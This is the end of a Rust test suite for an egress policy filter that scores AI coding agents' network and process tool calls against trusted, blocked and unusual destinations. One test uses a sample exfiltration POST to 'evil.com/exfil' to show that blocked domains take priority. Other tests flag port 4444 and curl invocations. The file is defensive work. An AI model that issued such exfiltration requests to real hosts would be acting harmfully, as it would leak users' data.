                method: "POST".into(),
                url: "https://api.anthropic.com/v1/messages".into(),
            },
            "codex",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_ne!(result.rule_id, "profile-trusted-destination");
    }

    #[tokio::test]
    async fn test_profile_trusted_net_connect() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("codex".into(), vec!["api.openai.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::NetConnect {
                address: "api.openai.com".into(),
                port: 443,
            },
            "codex",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_profile_trusted_subdomain_matching() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("aider".into(), vec!["anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        // Subdomain should match the profile trusted parent domain
        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://api.anthropic.com/v1/messages".into(),
            },
            "aider",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_profile_trusted_case_insensitive() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("Claude-Code".into(), vec!["API.Anthropic.COM".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://api.anthropic.com/v1/messages".into(),
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "profile-trusted-destination");
    }

    #[tokio::test]
    async fn test_global_trusted_still_works_with_profile() {
        // github.com is globally trusted — should still be trusted even with a profile
        let mut cfg = EgressPolicyConfig::default();
        cfg.trusted_domains = vec!["github.com".into()];
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["api.anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "GET".into(),
                url: "https://github.com/grith-ai/grith".into(),
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "trusted-destination");
        assert_eq!(result.score, -1.0);
    }

    #[tokio::test]
    async fn test_blocked_domain_overrides_profile_trusted() {
        // Even if a domain is profile-trusted, blocked domains take priority
        let mut cfg = EgressPolicyConfig {
            blocked_domains: vec!["evil.com".into()],
            ..Default::default()
        };
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["evil.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::HttpRequest {
                method: "POST".into(),
                url: "https://evil.com/exfil".into(),
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-domain");
        assert!(result.score > 0.0);
    }

    #[tokio::test]
    async fn test_profile_trusted_in_command_url() {
        let mut cfg = EgressPolicyConfig::default();
        cfg.profile_trusted_domains
            .insert("claude-code".into(), vec!["api.anthropic.com".into()]);
        let filter = EgressPolicyFilter::from_config(cfg);

        let ctx = make_ctx_with_profile(
            ToolCallType::ProcessSpawn {
                command: "curl".into(),
                args: vec!["https://api.anthropic.com/v1/messages".into()],
            },
            "claude-code",
        );

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // The command token "curl " triggers review, but profile-trusted destination
        // produces -1.0 — select_higher_risk picks the higher (positive) score
        assert!(
            result.rule_id == "review-egress-command-token"
                || result.rule_id == "profile-trusted-destination",
            "unexpected rule_id: {}",
            result.rule_id
        );
    }

    #[tokio::test]
    async fn test_process_spawn_local_binary_path_does_not_trigger_protocol_signal() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "/home/dan/.nvm/versions/node/v18.9.0/lib/node_modules/@openai/codex/node_modules/@openai/codex-linux-x64/vendor/x86_64-unknown-linux-musl/codex/codex".into(),
            args: vec!["exec".into(), "sandbox".into()],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            !result.matched || result.rule_id != "high-entropy-segment",
            "local executable paths should not trip command-argument entropy heuristics"
        );
    }

    #[tokio::test]
    async fn test_process_spawn_local_rg_shell_probe_does_not_trigger_egress_review() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::ProcessSpawn {
            command: "bash".into(),
            args: vec![
                "-c".into(),
                "rg --files -g 'README.md' -g 'readme.md'".into(),
            ],
        });

        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(
            !result.matched,
            "local shell file probes should not trigger egress review, got rule_id={} score={}",
            result.rule_id, result.score
        );
    }

    // ── NetListen tests (L-12) ────────────────────────────────────────

    #[tokio::test]
    async fn test_netlisten_blocked_port() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetListen {
            address: "0.0.0.0".into(),
            port: 25,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "blocked-port");
    }

    #[tokio::test]
    async fn test_netlisten_unusual_port() {
        let cfg = EgressPolicyConfig {
            review_unknown_destinations: false,
            ..EgressPolicyConfig::default()
        };
        let filter = EgressPolicyFilter::from_config(cfg);
        let ctx = make_ctx(ToolCallType::NetListen {
            address: "198.51.100.25".into(),
            port: 4444,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert_eq!(result.rule_id, "unusual-port");
    }

    #[tokio::test]
    async fn test_netlisten_unknown_destination() {
        let filter = EgressPolicyFilter::with_defaults();
        let ctx = make_ctx(ToolCallType::NetListen {
            address: "198.51.100.25".into(),
            port: 8080,
        });
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        // With review_unknown_destinations=true, unknown addresses should be flagged
        assert_eq!(result.rule_id, "unknown-destination");
    }

    // ── OpenClaw bind policy tests ────────────────────────────────────

    #[tokio::test]
    async fn test_openclaw_non_loopback_bind_scores_5() {
        let filter = EgressPolicyFilter::with_defaults();
        // 0.0.0.0 is not loopback — OpenClaw should score this ≥5.0
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "0.0.0.0".into(),
                port: 8080,
            },
            "openclaw",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.matched);
        assert!(
            result.score >= 5.0,
            "expected score >= 5.0 for openclaw non-loopback bind, got {}",
            result.score
        );
        assert_eq!(result.rule_id, "openclaw-non-loopback-bind");
    }

    #[tokio::test]
    async fn test_openclaw_loopback_bind_not_flagged_by_openclaw_rule() {
        let filter = EgressPolicyFilter::with_defaults();
        // 127.0.0.1 is loopback — OpenClaw rule must not fire
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "127.0.0.1".into(),
                port: 8080,
            },
            "openclaw",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        // The OpenClaw rule should not fire; rule_id must not be openclaw-non-loopback-bind
        assert_ne!(
            result.rule_id, "openclaw-non-loopback-bind",
            "loopback bind must not trigger openclaw-non-loopback-bind rule"
        );
        // Score from the openclaw rule itself must be 0 (loopback is fine)
        if result.rule_id == "openclaw-non-loopback-bind" {
            panic!("openclaw rule must not fire for 127.0.0.1");
        }
    }

    #[tokio::test]
    async fn test_openclaw_non_loopback_public_ip_scores_5() {
        let filter = EgressPolicyFilter::with_defaults();
        // A public IP is not loopback
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "203.0.113.1".into(),
                port: 9090,
            },
            "openclaw",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert!(result.score >= 5.0);
    }

    #[tokio::test]
    async fn test_non_openclaw_profile_no_loopback_rule() {
        let filter = EgressPolicyFilter::with_defaults();
        // Same 0.0.0.0 bind under a different profile — openclaw rule must not fire
        let ctx = make_ctx_with_profile(
            ToolCallType::NetListen {
                address: "0.0.0.0".into(),
                port: 8080,
            },
            "claude-code",
        );
        let result = filter.evaluate(&ctx).await.unwrap();
        assert_ne!(result.rule_id, "openclaw-non-loopback-bind");
    }

    #[test]
    fn test_is_loopback_bind_address() {
        assert!(is_loopback_bind_address("127.0.0.1"));
        assert!(is_loopback_bind_address("::1"));
        assert!(is_loopback_bind_address("localhost"));
        assert!(is_loopback_bind_address("LOCALHOST"));
        assert!(!is_loopback_bind_address("0.0.0.0"));
        assert!(!is_loopback_bind_address("192.168.1.1"));
        assert!(!is_loopback_bind_address("0.0.0.0"));
    }
}
